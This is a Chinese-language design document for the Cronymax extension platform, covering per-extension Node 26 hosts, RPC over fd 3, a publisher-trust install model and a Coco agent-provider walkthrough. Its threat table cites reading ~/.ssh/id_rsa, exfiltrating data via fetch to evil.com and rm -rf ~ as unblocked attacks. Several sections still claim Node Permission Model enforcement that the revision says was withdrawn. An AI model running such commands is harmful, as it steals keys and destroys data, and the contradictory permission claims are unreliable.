# Cronymax 扩展平台 — 设计文档 v0.3

状态：**Phase 0 评议通过（2026-05-20），Phase 1+ 推进中**

> **⚠️ 2026-05-20 v1-alpha 修订：去除 Node 26 Permission Model**
>
> 经过 dogfood UX 评估，v1 alpha **撤回**了 Node 26 capability gate 的设计。原因详见 [`permission-removal.md`](permission-removal.md)。
>
> **§6 整章已重写** —— 撤回内容：`build_node_flags` 翻译表 / 安装期 per-cap 同意 UI / fs path 白名单变量 / 绕过路径攻击面表。**§7 γ 阶段 OS sandbox 改为可选未来工作**。
>
> 新模型摘要：扩展进程**不带** `--permission` 或 `--allow-*` flag，拥有完整 Node API；信任边界从"代码级 OS gate"挪到"作者级 install-time 信任"，与 VS Code 同位。Per-extension host 保留（VS Code 没有的崩溃隔离卖点）。
>
> 仍然有效的：`§6.1.1` fd 3 RPC 通道、`§6.3` `cronymax.*` 命名空间锁定（platform-RPC 层、不是 OS 层）、`§6.1.2` 平台变量仍作为 `ctx.*Path` / env 路径来源（不再用于 flag 翻译）。

替换关系：**本文档替代 spec-v0.2**。v0.2 的"Node 22 LTS + 网络软门控 + child_process 平台 wrap"已废弃。v0.3 原定目标 Node 26（Permission Model 完整版），后续 v1-alpha 修订（见上方）去除了 Permission Model 依赖，仅保留 Node 26 作为运行时基线（不依赖其 capability flag）。

**Phase 0 评议引入的修订**：详见 §16.1 速查表 + [`phase-0-review.md`](phase-0-review.md)。配套文档：[`permission-removal.md`](permission-removal.md)（v1-alpha 撤回 permission model 的决策记录）、[`extension-logs.md`](extension-logs.md)（日志系统设计）、[`node26-permission-spike.md`](node26-permission-spike.md)、[`msgpack-rpc-spike.md`](msgpack-rpc-spike.md)、[`legacy-agent-step.md`](legacy-agent-step.md)。

---

## 0. 设计目标与非目标

cronymax 是 **agent workflow 应用**。

### 目标

- 第三方在**不修改 cronymax 核心代码**的前提下，向平台贡献 agent provider / tool / content renderer / view / settings page / theme / channel / fs provider 等
- **完整 Node 生态兼容**：扩展是普通 Node 包，npm 直接可用
- **极简安全实施**：Node 26 Permission Model 一条龙处理 fs / network / process / worker / addons / ffi / inspector，平台不写包装层
- **DX 贴近 VS Code 习惯**
- **平台可演化**：加新扩展点走 RFC 流程
- **α→γ 升级路径丝滑**：v1 上 Node Permission，M1 加 OS sandbox 外层

### 非目标（v1）

- 代码编辑器扩展性（LSP / DAP / grammar / formatter / linter / code lens）
- WASM runtime
- 跨扩展正式契约系统（schema + semver 版本管理）—— 用 VS Code 同款 `extension.exports`
- 远程开发模式（SSH / WSL / dev container）
- Marketplace 数字签名
- OS-level sandbox（M1+）
- 共享 Node host
- 内置 LLM provider 迁移到扩展模型
- per-command spawn 白名单 / 审计 / 网络包装（v0.2 设计的，现在确认不需要）

---

## 1. 总体架构

### 三层 + 进程模型

```
┌──────────────────────────────────────────────────────────────────┐
│ CEF Renderer Process                                             │
│  ┌──────────────────────┐  ┌──────────────────────────────────┐ │
│  │ cronymax UI (React)  │  │ 扩展 Webview iframes (sandbox)    │ │
│  │ chat / flows / inbox │  │ 设置页 / 侧栏 view / 渲染器        │ │
│  └──────────────────────┘  └──────────────────────────────────┘ │
└──────────────────────────┬───────────────────────────────────────┘
                           │ CEF browser query / event
                           ▼
┌──────────────────────────────────────────────────────────────────┐
│ Rust Core (cronymax 主进程)                                       │
│  Extension Manager · L2 Registry · L1.5 Event Bus · RPC Server   │
└─────┬──────────────────────┬───────────────────────┬─────────────┘
      │ 每扩展独立 Unix socket（Win Named Pipe）+ MessagePack-RPC  │
      ▼                      ▼                       ▼
┌──────────────────┐  ┌──────────────────┐  ┌──────────────────┐
│ Node host #1     │  │ Node host #2     │  │ Node host #N     │
│ bytedance.coco   │  │ acme.mermaid     │  │ ...              │
│                  │  │                  │  │                  │
│ node 26 \        │  │ node 26 \        │  │ node 26 \        │
│  --no-warnings \ │  │  --no-warnings \ │  │  --no-warnings \ │
│  bootstrap.js    │  │  bootstrap.js    │  │  bootstrap.js    │
│                  │  │                  │  │                  │
│  (v1 alpha:      │  │  (full Node API; │  │                  │
│   no --permission│  │   信任由 install-│  │                  │
│   no --allow-*)  │  │   time 给出)     │  │                  │
│                  │  │                  │  │                  │
│ ↓ require        │  │ ↓ require        │  │ ↓ require        │
│ main.ts + deps   │  │ main.ts + deps   │  │ main.ts + deps   │
└────────┬─────────┘  └──────────────────┘  └──────────────────┘
         │
         ▼
   ┌──────────────────┐
   │ coco acp serve   │
   └──────────────────┘
```

### 安全模型分层（v1-alpha 修订）

| 层 | 实现 | 何时上 |
|---|---|---|
| **L0 · 进程隔离** | 每扩展独立 Node host OS 进程，单扩展崩溃不拖死 cronymax 和其他扩展 | **v1** |
| **L1 · Install-time 作者信任** | 安装弹窗显示"由 \<publisher\> 提供"；用户决定信不信发行方 | **v1** |
| **L2 · Platform-RPC 命名空间锁定** | `cronymax.*` namespace 在 RPC 路由层保留给平台（emit / publisher / command id 三处） | **v1** |
| ~~L3 · VM 强制（Node Permission Model）~~ | ~~Node 26 `--permission` + `--allow-*`~~ | **撤回**，见 [`permission-removal.md`](permission-removal.md) |
| **L4 · 可选 OS Sandbox（平台级）** | sandbox-exec / bubblewrap / Job Object，cronymax 全局开关 | M1+ 视情况 |
| **L5 · Marketplace + 签名 + 行为监控** | 社会化机制 | M2+ |

---

## 2. L1 Kernel — 14 个原语

> **v1-alpha 修订**：原"Capability flag"列已撤回（fs / network / process 等不再 OS 层强制）。下表列的是平台提供的 API surface 和 RPC 路由层的 namespace 约束。

| 原语 | 实现 | 平台层约束 |
|---|---|---|
| `lifecycle` | `activate(ctx)` / `deactivate()` | n/a |
| `commands` | 注册具名可调用 | `cronymax.*` namespace 保留给平台 |
| `events` | pub/sub topic | `cronymax.*` topic 平台 emit 专用；扩展 emit 时拒 |
| `config` | get/update + onDidChange | n/a |
| `secrets` | Keychain / DPAPI / secret-service | `cronymax.*` secret id 保留 |
| `storage` | per-extension state KV | n/a |
| `process` | 扩展直接用 `node:child_process` | n/a（无 OS gate） |
| `fs` | 扩展直接用 `node:fs` | n/a（无 OS gate） |
| `network` | 扩展直接用 `fetch` / `node:net` | n/a（无 OS gate） |
| `ui-slots` | 标识贡献槽位 | n/a |
| `webview` | CEF iframe + postMessage 中转 | n/a |
| `auth` | 内置 OAuth / PKCE / device-flow | n/a |
| `extensions` | getExtension + exports | n/a |

**关键**：fs / network / process 三大块**扩展直接用 Node API**，平台不 wrap、不 gate。VS Code 同位的信任模型。

### SDK 形状

```ts
declare namespace cronymax {
  function activate(handler: (ctx: ExtensionContext) => Promise<void>): void;

  const commands: { register; execute; };
  const events:   { on; emit; };
  const workspace: {
    rootUri: URI | undefined;
    fs: WorkspaceFileSystem;            // 包装真 Node fs，提供 URI 抽象
    getConfiguration(section?): Configuration;
    onDidChangeConfiguration(handler): Disposable;
  };
  const process:  { spawn(opts): Promise<ChildProcess>; };  // 直接调真 child_process
  const network:  { fetch; websocket; };                    // 真 Node fetch
  const secrets:  { get; set; delete; };
  const window:   { showInformationMessage; createWebviewPanel; openConfigPage; };

  const agents:  { registerProvider; getProvider; };
  const chat:    { ... };
  const renderers: { ... };

  const extensions: { getExtension; readonly all; };
  const env:        { appName; platform; homedir; machineId; };
}
```

扩展可直接 `import { spawn } from "child_process"` 或 `fetch(...)`，**Node 自己拦截不合规调用**。

---

## 3. L1.5 平台事件主题

平台命名空间 `cronymax.*` 下的事件。扩展通过 `cronymax.events.on(topic, handler)` 订阅，需 manifest `capabilities.events.subscribe` 显式声明。

### v1 入门 8 条

| 主题 | payload |
|---|---|
| `cronymax.session.started` | `{ sessionId, providerId, agentId?, model }` |
| `cronymax.session.ended` | `{ sessionId, reason }` |
| `cronymax.message.user.sent` | `{ sessionId, turnId, text }` |
| `cronymax.message.assistant.delta` | `{ sessionId, turnId, textDelta }` |
| `cronymax.message.assistant.done` | `{ sessionId, turnId, fullText, finishReason }` |
| `cronymax.tool.invoked` | `{ sessionId, turnId, toolCallId, name, input, source }` |
| `cronymax.tool.completed` | `{ sessionId, toolCallId, status, output }` |
| `cronymax.permission.requested` | `{ sessionId, requestId, target, options }` |

---

## 4. L2 Extension Points

12 候选；v1 起步 6 个。

| EP | M0 |
|---|---|
| `cronymax.command` | ✅ |
| `cronymax.keybinding` | M1 |
| `cronymax.menu.item` | M1 |
| `cronymax.config.schema` | ✅ |
| `cronymax.config.page` | ✅ |
| `cronymax.ui.activitybar.item` | M1 |
| `cronymax.ui.sidebar.view` | ✅ |
| `cronymax.ui.statusbar.item` | M1 |
| `cronymax.content.renderer` (block) | ✅ |
| **`cronymax.agents.provider`** | ✅ |
| `cronymax.chat.tool` | M1 |
| `cronymax.workspace.fs-provider` | M1 |

### `cronymax.agents.provider` 完整规范

**清单声明**：
```jsonc
"contributes": {
  "cronymax.agents.provider": [{
    "id": "coco",
    "label": "Coco",
    "icon": "$(coco)",
    "description": "ByteDance Coco via ACP",
    "supportsModels": true,
    "supportsModes": true,
    "supportsMcp": true
  }]
}
```

**Runtime 注册**：
```ts
cronymax.agents.registerProvider(id: string, impl: AgentProvider): Disposable;

interface AgentProvider {
  listModels(): Promise<ModelInfo[]>;
  modes?: ModeInfo[];
  createSession(opts: SessionOptions): Promise<AgentSession>;
}

interface SessionOptions {
  cwd: string;
  model?: string;
  mode?: string;
  mcpServers?: McpServerSpec[];
  systemPrompt?: string;
  allowedTools?: string[];
}

interface AgentSession {
  readonly id: string;
  prompt(message: PromptMessage, token: CancellationToken): AsyncIterable<AgentEvent>;
  cancel(): Promise<void>;
  dispose(): Promise<void>;
}

type AgentEvent =
  | { kind: "text"; text: string }
  | { kind: "thinking"; text: string }
  | { kind: "toolCall"; id; name; input; source; status: "in_progress" }
  | { kind: "toolCallUpdate"; id; status: "completed" | "failed"; output }
  | { kind: "permissionRequest"; requestId; tool; options }
  | { kind: "done"; stopReason };
```

**平台消费方**：聊天面板 + flow runtime（共享同一份 registry）。

---

## 5. Node Host 进程模型

| 维度 | 选择 |
|---|---|
| Node 版本 | **Node 26**（Permission Model 完整版含 `--allow-net` / `--allow-ffi` / `--allow-inspector`）|
| Node 来源 | 打包进 cronymax build |
| 隔离粒度 | **每扩展独立 OS 进程** |
| 启动 | Lazy activate（被需要时才起）|
| 回收 | 不主动 deactivate（cronymax 退出才退）|
| IPC | Unix socket（Win Named Pipe）+ MessagePack-RPC |
| 模块系统 | CJS 主推；ESM M1 完善 |

### 资源占用

- 单 host 稳态 ~50-80MB
- 首次激活 80-200ms
- 典型重度用户（8 扩展）~500MB

VS Code 等量场景 EH 一进程 ~500-1000MB；cronymax 独立 host 模型 RAM 近似但隔离更强。

### 启动延迟缓解

1. cronymax 启动时按 "上次会话用过" 列表静默预热常用扩展
2. 激活时 UI spinner（200ms 内可接受）
3. 不主动 deactivate
4. M1 评估 host 池预热 / `--snapshot-blob`

---

## 6. 信任模型 · v1 alpha

> **本章在 2026-05-20 重写**。之前的 capability-flag 强制模型撤回，原因见 [`permission-removal.md`](permission-removal.md)。

### 6.1 信任边界：install-time 作者信任

v1 alpha 不在 OS 层 gate 扩展。扩展进程拥有完整 Node API（fs / network / child_process / workers / native addons）。信任由用户在**安装时**对**扩展作者**给出，没有运行时 per-capability gate。

```rust
// crates/cronymax/src/extensions/capability.rs
//
// v1 alpha 的 build_node_flags 几乎没事可做。
pub fn build_node_flags(_manifest: &Manifest, _ctx: &ExpansionCtx) -> ExtensionResult<Vec<String>> {
    Ok(vec!["--no-warnings".to_string()])
}
```

**只 emit `--no-warnings`**（抑制 Node experimental warning 噪音）。**不 emit** `--permission`、不 emit 任何 `--allow-*`。

### 6.1.1 RPC 通道：inherited fd 3，不走 Unix socket

虽然不再 emit `--allow-net`，**fd 3 仍然是 RPC 通道**：

```rust
Command::new(&node_bin)
    .args(&flags)
    .arg(bootstrap_js)
    // stdio: [stdin, stdout, stderr, fd3]
    //         ╲ pipe ╲ pipe → output.log ╲ pipe → host.log ╲ pipe ← RPC 通道
    .stdio_with_extras([Pipe, Pipe, Pipe, Pipe])
    .spawn()
```

```js
const net = require("node:net");
const rpc = new net.Socket({ fd: 3 });
```

保留 fd 3 原因：
- 跟扩展用的 IPC 通道完全分离，不会跟扩展自己开的 Unix socket / TCP 混
- 父进程通过 `pre_exec + dup2` 注入，扩展拿不到 RPC fd 之外的"控制平面"权限去伪造平台事件
- 跟 stdout / stderr 自然分流，平台的日志 / 扩展的 `console.log` 互不干扰

### 6.1.2 平台变量集

变量仍存在，但**只作为 `ctx.*Path` / 环境变量的来源**，不再用于 capability flag 翻译。Manifest 里**不需要**通过 `capabilities.fs` 申报这些变量。

| 变量 | 展开值 | 给扩展的方式 |
|---|---|---|
| `{WORKSPACE}` × N | 当前所有打开的 workspace 根（v1 multi-root） | `ctx.workspaceFolders[]`、`CRONYMAX_WORKSPACE_FOLDERS` env（JSON 数组） |
| `{HOME}` | `$HOME` / `%USERPROFILE%` | 扩展用 `os.homedir()`；平台不特别注入 |
| `{EXT_DIR}` | `~/.cronymax/extensions/<id>/` | `ctx.extensionPath`、`CRONYMAX_EXTENSION_DIR` env |
| `{EXT_STORAGE}` | `~/.cronymax/extensions/<id>/storage/` | `ctx.storagePath`、`CRONYMAX_EXTENSION_STORAGE` env |
| `{EXT_GLOBAL_STORAGE}` | `~/.cronymax/global-state/<id>/` | `ctx.globalStoragePath`、`CRONYMAX_EXTENSION_GLOBAL_STORAGE` env |
| `{TMP}` | `os.tmpdir()` | 扩展用 `os.tmpdir()` |
| `{CRONYMAX_CONFIG}` | `~/.cronymax/` | 扩展不直接拿；走 `cronymax.workspace.getConfiguration()` |

环境变量全部传 **canonical 路径**（symlink 已解开）。扩展直接读 `ctx.storagePath` 等就能避开 macOS `/var` ↔ `/private/var` 那类 realpath 解析坑。

### 6.2 安装期同意

```
┌────────────────────────────────────────────┐
│ 安装 Coco                                   │
│ by bytedance · v0.1.0                       │
│                                             │
│ 这个扩展将由 bytedance 提供。               │
│                                             │
│ [详情]            [取消]      [安装]         │
└────────────────────────────────────────────┘
```

**没有** per-capability 列表、**没有**风险提示。决定全在"信不信发行方"。这跟 VS Code 安装扩展的 UX 一致。

### 6.3 命名空间锁定

唯一保留的 gate —— 但**在平台 RPC 路由层，不是 OS 层**：

| 命名空间 | 谁拥有 | 第三方写 |
|---|---|---|
| `cronymax.*` | 平台 | 安装期校验拒（`publisher == "cronymax"` 拒；`cronymax.*` event topic 拒；`cronymax.*` command id 拒） |
| `<publisher>.*` | 该 publisher | 仅自家扩展 |

理由：扩展 emit `cronymax.message.user.sent` 假冒平台事件、抢注 `cronymax.builtin.foo` 命令、抢注 `cronymax.system` 密钥都是 platform-RPC-routing 层问题，跟 OS 权限正交。这层保留。

### 6.4 v1-alpha 不防的攻击

明确列出来，让用户和发行方都知道边界：

| 攻击 | v1 alpha 拦截？ |
|---|---|
| 恶意扩展读 `~/.ssh/id_rsa` | ❌ 不拦（扩展有完整 fs 权限） |
| 恶意扩展 `fetch('https://evil.com', ...)` 外发数据 | ❌ 不拦 |
| 恶意扩展 spawn `rm -rf ~` | ❌ 不拦 |
| 恶意扩展加载 `.node` native addon | ❌ 不拦 |
| 恶意扩展 emit `cronymax.message.assistant.done` 伪造平台事件 | ✅ 拦（platform-RPC 命名空间） |
| 恶意扩展使用 `publisher = "cronymax"` 冒充官方 | ✅ 拦（install-time 校验） |
| 恶意扩展跨进程拖死同 workspace 别的扩展 | ✅ 不会发生（per-extension host） |
| 一个扩展崩溃影响别的扩展 | ✅ 不会发生（同上） |

**用户的防御**是发行方信任 —— 装之前看是谁发布的，看 GitHub stars、issue 反应、code review 是否公开。

### 6.5 后续可选加固

v1.x / M1 阶段如果有用户抱怨"扩展太开放"，平台**可选**在**平台层**（不是扩展层）叠加 OS sandbox（macOS sandbox-exec、Linux bubblewrap、Windows Job Object）。这是 cronymax 用户的总开关，不通过 manifest 配置 —— 见 §7。

**关键设计原则**：扩展开发者写 manifest 时**不需要思考**安全边界 —— 那是用户和平台的事。这跟 VS Code 同位，跟 v0.3 原始设计（每扩展自己申报 capability）正相反。

---

## 7. 可选加固：平台层 OS sandbox（M1+ 未排期）

v1 alpha **没有**这一层 —— 撤回 Node 26 Permission Model 后，唯一的安全边界是"用户信任扩展作者"（§6.1）。如果某个 cronymax 部署场景需要更严格的隔离（譬如企业内部 sysadmin 部署给非可信用户），可以在**平台层**叠加 OS sandbox：

```
Rust core spawn:
  sandbox-exec -f /tmp/cronymax.sb -- \
    node 26 bootstrap.js
                          ↑
                v1 已有的 Node host（不带 --permission）
```

关键：sandbox profile 是**平台级**（cronymax 用户的全局开关），**不**让扩展开发者通过 manifest 配置。开发者写 manifest 时不感知这一层；平台或 sysadmin 决定开不开。

| 平台 | 实现 | 工程量 |
|---|---|---|
| macOS | SBPL 模板 | ~1 周 |
| Linux | bubblewrap + seccomp BPF | ~1 周 |
| Windows | Job Object + AppContainer | ~2 周 |
| 共用：profile 生成 + 测试 | ~1 周 |
| **小计** | **4-5 周** |

**v1 alpha 不做此项**。未来如果加，profile 内容大致："允许扩展进程读写它的 `ctx.*Path` 列表里的目录 + 用户当前所有 workspace folders + `os.tmpdir()`；拒绝读 `~/.ssh` `~/.aws` `~/.config/gh` 之类高敏感目录；网络默认开"。具体规则等真有 deploy case 再定。

---

## 8. 扩展清单 schema

```jsonc
{
  // 标识
  "id":        "publisher.name",     // 必须 publisher 前缀
  "name":      "Display Name",
  "version":   "1.0.0",
  "publisher": "publisher",
  "engines":   { "cronymax": "^1.0" },
  "main":      "./dist/main.js",

  // 描述
  "description": "...",
  "icon":      "./icon.png",
  "repository": "...",
  "license":   "MIT",

  // 激活事件
  "activationEvents": [
    "onAgentProvider:coco",
    "onCommand:coco.openSettings"
  ],

  // L2 EP 贡献
  "contributes": {
    "cronymax.agents.provider": [...],
    "cronymax.command": [...],
    "cronymax.config.schema": {...},
    "cronymax.config.page": [...]
  },

  // 跨扩展依赖
  "extensionDependencies": ["other.extension"]
}
```

> **v1-alpha 修订**：`capabilities` 字段已撤回（曾包含 `fs / network / process / workers / native_addons / secrets / events.subscribe / events.emit / ui-slots / extension-points / auth.providers`）。旧 manifest 里如果还有这个字段，平台**接受**但**不解释** —— 内容会被忽略。新扩展不需要写。撤回原因见 [`permission-removal.md`](permission-removal.md)。

### 校验规则

- `id` 必须 `<publisher>.<name>`；`<publisher>` 必须等于 `publisher` 字段
- `publisher == "cronymax"` 拒（平台保留）
- `contributes` key 必须以 `cronymax.` 开头（platform-RPC 路由层；并非 OS 强制）
- `activationEvents` 每条必须是已知前缀（`onStartup` / `*` / `onCommand:<id>` / `onAgentProvider:<id>` / `onView:<id>`）

---

## 9. Webview 通信链路

扩展 webview iframe 跟扩展 main.ts 跨进程（webview 在 CEF Renderer，main.ts 在 Node host）：

```
扩展 webview iframe (CEF Renderer)
   │ panel.postMessage({type, payload})
   ▼
CEF 拦截 → cronymax-webview://<ext-id>/<panel-id>
   │ 经现有 browser query 上报 Rust
   ▼
Rust core 鉴权 + 转 Node host: rpc.notify("webview/postMessage", ...)
   ▼
Node host 路由到 vm.Context 内 panel.onDidReceiveMessage handler
```

反向同理。4 跳 IPC，配置页类低频交互无所谓。

---

## 10. 扩展生命周期

```
未安装 ──install──► 已安装/未启用 ──enable──► 已启用/未激活
                                                      │ activationEvent
                                                      ▼
                                              已激活/运行中
                                                      │ deactivate
                                                      ▼
                                              已启用/未激活
                                                      │ disable
                                                      ▼
                                              已安装/未启用
                                                      │ uninstall
                                                      ▼
                                                  未安装
```

- **install**：解压到 `~/.cronymax/extensions/<id>/`，校验 manifest，弹安装确认（"由 \<publisher\> 提供，是否安装"；见 §6.2）
- **activate**：
  1. Rust 检查 host 池
  2. spawn Node 26 with `--no-warnings bootstrap.js`（v1 alpha：没有 `--permission`、没有 `--allow-*`）
     · stdio: `[pipe, pipe, pipe, pipe]`（fd 0 stdin / fd 1 stdout→output.log / fd 2 stderr→host.log / fd 3 RPC）
  3. bootstrap.js wrap fd 3 为 net.Socket，握手，调 `extension/activate`
  4. require main.js（运行在 Node 主 vm context；不另开 vm.Context）
  5. activate 抛出异常 → RPC response error 返回平台 → host.log 记录 stderr
- **crash 与错误处理**：exit code 非零或 ping/pong 超时 → 自动重启 ≤ 3 次 → 超后禁用并通知用户。stderr / stdout pipe 进 `host.log` / `output.log` 作为操作排错用途（不是 security audit）

---

## 11. 端到端走查：coco-acp

### 项目结构

```
coco-extension/
├── package.json
├── cronymax-extension.json
├── tsconfig.json
├── src/
│   ├── main.ts
│   ├── acp-client.ts          ← 直接 import { spawn } from "child_process"
│   ├── coco-session.ts
│   └── settings/
│       ├── index.html
│       └── index.ts
└── dist/                       ← esbuild CJS 输出
```

### cronymax-extension.json

```jsonc
{
  "id": "bytedance.coco",
  "name": "Coco",
  "version": "0.1.0",
  "publisher": "bytedance",
  "engines": { "cronymax": "^1.0" },
  "main": "./dist/main.js",

  "activationEvents": [
    "onAgentProvider:coco",
    "onCommand:coco.openSettings"
  ],

  "contributes": {
    "cronymax.agents.provider": [{
      "id": "coco",
      "label": "Coco",
      "icon": "$(coco)",
      "description": "ByteDance Coco via ACP",
      "supportsModels": true,
      "supportsModes": true,
      "supportsMcp": true
    }],
    "cronymax.command": [
      { "id": "coco.openSettings", "title": "Coco: Open Settings" }
    ],
    "cronymax.config.schema": {
      "title": "Coco",
      "properties": {
        "coco.binaryPath":   { "type": "string", "default": "coco" },
        "coco.defaultModel": { "type": "string", "default": "GPT-5.4" },
        "coco.defaultMode":  { "type": "string", "enum": ["default","plan","bypass_permissions"], "default": "default" },
        "coco.yolo":         { "type": "boolean", "default": false }
      }
    },
    "cronymax.config.page": [{
      "id": "coco.advanced",
      "title": "Coco · Advanced",
      "entry": "./dist/settings/index.html"
    }]
  }
  // v1-alpha 修订：没有 capabilities 字段了。扩展有完整 Node API；
  // coco 直接用 `node:fs`、`node:child_process`、`fetch()`。
}
```

### src/main.ts

```ts
import * as cronymax from "@cronymax/extension";
import { AcpClient } from "./acp-client";
import { CocoSession } from "./coco-session";

export async function activate(ctx: cronymax.ExtensionContext) {
  ctx.subscriptions.push(
    cronymax.agents.registerProvider("coco", {
      async listModels() {
        const client = await AcpClient.spawnEphemeral();
        try {
          await client.initialize();
          const probe = await client.newSession({
            cwd: cronymax.workspace.rootUri?.fsPath ?? process.cwd(),
            mcpServers: []
          });
          return probe.models.availableModels.map(m => ({
            id: m.modelId, label: m.name, description: m.description
          }));
        } finally {
          await client.shutdown();
        }
      },
      modes: [
        { id: "default", label: "Default" },
        { id: "plan", label: "Plan" },
        { id: "bypass_permissions", label: "Accept All Tools" }
      ],
      async createSession(opts) {
        const cfg = cronymax.workspace.getConfiguration("coco");
        const client = await AcpClient.spawn({
          binaryPath: cfg.get<string>("binaryPath"),
          yolo: cfg.get<boolean>("yolo")
        });
        await client.initialize();
        const acp = await client.newSession({
          cwd: opts.cwd, mcpServers: opts.mcpServers ?? []
        });
        if (opts.mode)  await client.setMode(acp.sessionId, opts.mode);
        if (opts.model) await client.setModel(acp.sessionId, opts.model);
        return new CocoSession(client, acp);
      }
    }),
    cronymax.commands.register("coco.openSettings", () =>
      cronymax.window.openConfigPage("coco.advanced"))
  );
}

export async function deactivate() {}
```

### src/acp-client.ts

```ts
import { spawn, ChildProcess } from "child_process";   // 真 Node 标准 API
import { createInterface } from "readline";

export class AcpClient {
  static async spawn(opts: { binaryPath?: string; yolo?: boolean }) {
    const args = ["acp", "serve"];
    if (opts.yolo) args.push("--yolo");
    const proc = spawn(opts.binaryPath ?? "coco", args, {
      stdio: ["pipe","pipe","pipe"]
    });
    return new AcpClient(proc);
  }
  // ... JSON-RPC framing
}
```

**注意**：直接 `import { spawn } from "child_process"`，没经任何 cronymax wrap。Node Permission Model 在 VM 层兜底（如果 manifest 没声明 process 就 throw）。

### 用户流程

```
1. cronymax ext install bytedance.coco-0.1.0.crx
   → 平台解压、校验、弹授权窗
   → 用户 Allow → 写入 registry.json

2. 用户开聊天面板
   → 平台扫已装扩展 manifest，agent picker 列出 "Coco"（未激活）

3. 用户点选 "Coco"
   → 触发 onAgentProvider:coco
   → Rust：spawn Node 26 host (stdio: [pipe,pipe,pipe,pipe]，fd 3 = RPC)：
     node --no-warnings extension-host-bootstrap.js
     env:
       CRONYMAX_EXTENSION_MANIFEST=/Users/alice/.cronymax/extensions/bytedance.coco/cronymax-extension.json
       CRONYMAX_EXTENSION_DIR=/Users/alice/.cronymax/extensions/bytedance.coco
       CRONYMAX_EXTENSION_STORAGE=/Users/alice/.cronymax/extensions/bytedance.coco/storage
       CRONYMAX_EXTENSION_GLOBAL_STORAGE=/Users/alice/.cronymax/global-state/bytedance.coco
       CRONYMAX_WORKSPACE_FOLDERS=["/Users/alice/work/cronymax-ws"]
   → bootstrap.js wrap fd 3 为 net.Socket，握手
   → require main.js + 调 activate(ctx)
   → ctx.workspaceFolders、ctx.storagePath 等已是 canonical 路径
   → register agents.provider("coco", ...)

4. 用户配置 Coco / GPT-5.4 / plan，发消息
   → 聊天面板：provider.createSession()
   → main.ts: `import { spawn } from "node:child_process"` → spawn("coco", ["acp","serve"])
     （v1 alpha：无 OS gate，扩展直接用 Node API）
   → ACP initialize / session/new
   → 返回 CocoSession

5. session.prompt(msg)：
   → RPC 流式回事件
   → 聊天面板按 event.kind 渲染
```

### flows 里用 Coco

```yaml
id: code-reviewer
provider: coco                       # 引用 agents.provider 的 id
provider_config:
  model: GPT-5.4
  mode: plan
system_prompt: |
  You are a senior code reviewer...
allowed_tools:
  - cronymax.tool.shell
```

flow runtime 走到 `type: agent, agent: code-reviewer` 时，从 registry 拿 Coco provider 调 createSession，事件流回。**跟聊天面板路径等价**。

---

## 12. 平台代码改动清单

### `crates/cronymax/src/extensions/`（新增）

- `manifest.rs` — schema 解析 + 校验 + canonicalize
- `registry.rs` — 元数据扫描 + 状态持久化
- `activation.rs` — activationEvents 匹配
- `host/`
  - `node.rs` — Node 26 进程池 + spawn + 监控
  - `bootstrap/` — bootstrap.js + SDK 注入
- `capability.rs` — manifest → Node flags 转换
- `contributions/` — L2 EP 注册中心
- `events.rs` — L1.5 平台事件总线
- `rpc/` — MessagePack-RPC 服务端
- `api/` — cronymax/v1 Rust 实现
  - `commands.rs` / `events.rs` / `secrets.rs` / `agents.rs` / `window.rs` / `workspace.rs` / `extensions.rs`
  - **不需要** `fs.rs` / `process.rs` / `network.rs`（这些 Node 自己管）

### `web/src/panels/chat/`（修改）

- 替换硬编码 LLM provider 列表为 `registry.consume("cronymax.agents.provider")`
- session 创建/路由统一走 AgentProvider 接口
- 事件流转翻译统一格式

### `web/src/panels/flows/agents/`（新增）

- AgentList.tsx / NewAgentWizard.tsx / AgentEditor.tsx

### `crates/cronymax/src/flow/`（修改）

- agent step → 通过 AgentProvider registry 调度
- 加载 `.cronymax/agents/<id>.agent.yaml` 解析 provider + provider_config

### `crates/cronymax/src/capability/agent_loader.rs`（修改）

- AgentDef 加 provider + provider_config 字段

### `web/src/panels/settings/extensions/`（新增）

- 扩展列表 / 安装 / 卸载 / 启用 / 禁用 / 配置 / 撤销 capability

### `web/src/extensions/sdk/`（新增）`@cronymax/extension`

- TypeScript SDK，从 Rust IDL codegen 类型声明
- npm 包发布

### Node 26 二进制打包

- macOS arm64 / x64 / Linux x64 / Windows x64
- 总增量 ~50-75MB per platform

---

## 13. 决策表 v0.3（最终）

| # | 决策 | 终值 |
|---|---|---|
| 1 | 架构层数 | L1 Kernel + L1.5 Events + L2 EPs |
| 2 | 命名 | AgentProvider / AgentSession |
| 3 | 命名空间锁 | `cronymax.*` reserved；publisher 前缀强制 |
| 4 | 主要 runtime | **Node 26**（含 `--allow-net` / `--allow-ffi` / `--allow-inspector`）|
| 4a | Node 来源 | 打包进 cronymax |
| 4b | 进程模型 | **每扩展独立 host** + lazy activate + 不主动 deactivate |
| 4c | IPC | **Inherited fd 3** (stdio pipe) + MessagePack-RPC。**改自 Unix socket** —— Phase 0 spike 发现 Node 26 把 socket connect 算 network ACL，会强制平台 emit `--allow-net`，破坏"网络是用户 capability"语义。fd 3 wrap 不触发 ACL。 |
| 4d | Capability 实施 α | **纯 Node Permission Model + 极少量 bootstrap.js hook**（console.* 拦截 + process.on('uncaughtException') + activate try/catch；均为 global API 替换 / 公开 event 注册，**不**包含 require 劫持、命令白名单、网络包装）。Node 26.1.0 `--allow-net` 是 boolean（无主机过滤）；manifest `network.allow` 仅作安装期人话授权用。M1 等 Node 27/28 host-scoped 落地后升级。 |
| 4e | Capability 实施 γ | M1 加 OS sandbox 外层 |
| 5 | API 真相之源 | TS interface IDL → codegen .d.ts |
| 6 | RPC 编码 | MessagePack-RPC（`rmp-serde` ↔ `@msgpack/msgpack`；裸数组帧；P99 实测 18-30μs）|
| 7 | 清单文件名 | `cronymax-extension.json` |
| 8 | 跨扩展通信 | VS Code 同款 `extension.exports`（无 schema / semver）|
| 9 | UI 沙箱 | CEF iframe 独立 origin；跨进程经 Rust 中转 |
| 10 | v1 L2 EP 数 | 6 个 |
| 11 | 内容渲染器 | block 入 v1；inline 推 M1 |
| 12 | 模块系统 | v1 主推 CJS；ESM 完善推 M1 |
| 13 | 调试 | 标准 Node Inspector（启动 host 加 `--inspect`）|

---

## 14. 风险登记 v0.3

| 风险 | 缓解 | 决策节点 |
|---|---|---|
| R1 · Node host RAM 8 扩展 ~500MB | 接受；M1 评估 host 池 | M1 |
| R2 · 首次激活 80-200ms 延迟 | 预热常用扩展 + spinner | Phase 7 末 |
| R3 · Node 26 当前 vs LTS | Phase 0 spike 实测 --allow-net 等新 flag 行为；评估 ship 时 LTS 状态 | Phase 0 末 |
| R4 · 资源耗尽 / 死循环 | Rust 监控 + 限额 + 强杀 | Phase 10 |
